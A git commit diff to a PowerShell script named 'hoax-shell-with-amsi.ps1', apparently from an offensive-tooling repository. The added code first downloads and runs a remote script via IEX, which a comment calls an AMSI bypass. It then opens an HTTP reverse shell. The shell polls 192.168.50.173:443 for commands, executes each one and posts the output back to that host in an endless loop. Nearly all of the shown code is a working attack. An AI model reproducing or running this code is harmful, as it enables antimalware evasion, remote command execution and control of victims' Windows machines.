fde2ed1f79f8bb3cef6344bffd1c7c20049e3805
paulkwalton <43542501+paulkwalton@users.noreply.github.com>
2025-01-02 16:06:32 +0000

    Update hoax-shell-with-amsi.ps1

--- privesc/windows/hoax-shell-with-amsi.ps1
+++ privesc/windows/hoax-shell-with-amsi.ps1
@@ -3,13 +3,28 @@ $scriptUrl = "https://raw.githubusercontent.com/paulkwalton/thescriptvault/refs/
 
 $scriptBlock = {
     try {
-        IEX (Invoke-WebRequest -Uri $scriptUrl)
+        IEX (Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing)
     }
     catch {
         Write-Error "Error executing external script: $_"
-        # Consider exiting the script here if the error is critical
-        # exit 1
+        exit 1
     }
 }
 
+# Run the AMSI bypass script first
 . $scriptBlock
+
+# Define the subsequent script
+$s = '192.168.50.173:443'
+$i = '14f30f27-650c00d7-fef40df7'
+$p = 'http://'
+$v = IRM -UseBasicParsing -Uri $p$s/14f30f27 -Headers @{"Authorization" = $i}
+while ($true) {
+    $c = (IRM -UseBasicParsing -Uri $p$s/650c00d7 -Headers @{"Authorization" = $i})
+    if ($c -ne 'None') {
+        $r = IEX $c -ErrorAction Stop -ErrorVariable e
+        $r = Out-String -InputObject $r
+        $t = IRM -Uri $p$s/fef40df7 -Method POST -Headers @{"Authorization" = $i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e + $r) -join ' ')
+    }
+    Start-Sleep -Seconds 0.8
+}
